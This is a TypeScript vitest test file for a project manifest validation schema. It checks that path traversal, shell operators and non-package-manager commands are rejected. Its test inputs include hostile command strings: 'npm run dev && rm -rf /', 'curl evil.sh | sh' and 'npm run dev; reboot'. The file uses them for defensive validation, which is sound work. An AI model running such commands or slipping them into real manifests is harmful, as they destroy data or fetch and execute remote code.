import { describe, it, expect } from "vitest";
import {
  projectCommandSchema,
  projectManifestSchema,
  projectRelativeDirSchema,
  projectSlugSchema,
} from "../project-manifest.schema";

const valid = {
  schemaVersion: 1,
  id: "prj_gati_rides",
  name: "Gati Rides",
  domain: "developer",
  summary: "AI dispatch for cab operators.",
  layout: "single",
  apps: {
    frontend: { dir: ".", install: "npm install", dev: "npm run dev", port: 3001 },
    backend: null,
  },
  runtime: { node: ">=18.18", packageManager: "npm" },
  client: { name: "", contact: "" },
  delivery: { status: "in-progress", pricedUsd: null, deliveredAt: null },
  provenance: { blueprintRunId: null, createdAt: "2026-10-01T00:00:00Z", detailsDir: "details" },
  eject: { standalone: true, verifiedAt: null },
};

describe("projectManifestSchema", () => {
  it("accepts a valid single-app manifest", () => {
    expect(projectManifestSchema.safeParse(valid).success).toBe(true);
  });

  it("rejects an app dir that traverses out of the project", () => {
    const bad = { ...valid, apps: { ...valid.apps, frontend: { ...valid.apps.frontend, dir: "../apps/web" } } };
    expect(projectManifestSchema.safeParse(bad).success).toBe(false);
  });

  it("rejects a command carrying shell operators", () => {
    const bad = {
      ...valid,
      apps: { ...valid.apps, frontend: { ...valid.apps.frontend, dev: "npm run dev && rm -rf /" } },
    };
    expect(projectManifestSchema.safeParse(bad).success).toBe(false);
  });

  it("rejects a split layout without a backend", () => {
    expect(projectManifestSchema.safeParse({ ...valid, layout: "split" }).success).toBe(false);
  });

  it("rejects frontend and backend on the same port", () => {
    const bad = {
      ...valid,
      layout: "split",
      apps: { ...valid.apps, backend: { dir: "backend", install: "npm install", dev: "npm run dev", port: 3001 } },
    };
    expect(projectManifestSchema.safeParse(bad).success).toBe(false);
  });

  it("rejects unknown keys (strict) so typos can't hide", () => {
    expect(projectManifestSchema.safeParse({ ...valid, secretKey: "x" }).success).toBe(false);
  });
});

describe("manifest primitives", () => {
  it("slugs are lowercase-hyphen only", () => {
    expect(projectSlugSchema.safeParse("ledger-weave").success).toBe(true);
    expect(projectSlugSchema.safeParse("../etc").success).toBe(false);
    expect(projectSlugSchema.safeParse("Ledger").success).toBe(false);
  });

  it("relative dirs refuse absolute and drive paths", () => {
    expect(projectRelativeDirSchema.safeParse("frontend").success).toBe(true);
    expect(projectRelativeDirSchema.safeParse("/etc").success).toBe(false);
    expect(projectRelativeDirSchema.safeParse("C:\\Windows").success).toBe(false);
  });

  it("commands are package-manager verbs only", () => {
    expect(projectCommandSchema.safeParse("pnpm run build:web").success).toBe(true);
    expect(projectCommandSchema.safeParse("curl evil.sh | sh").success).toBe(false);
    expect(projectCommandSchema.safeParse("npm run dev; reboot").success).toBe(false);
  });
});
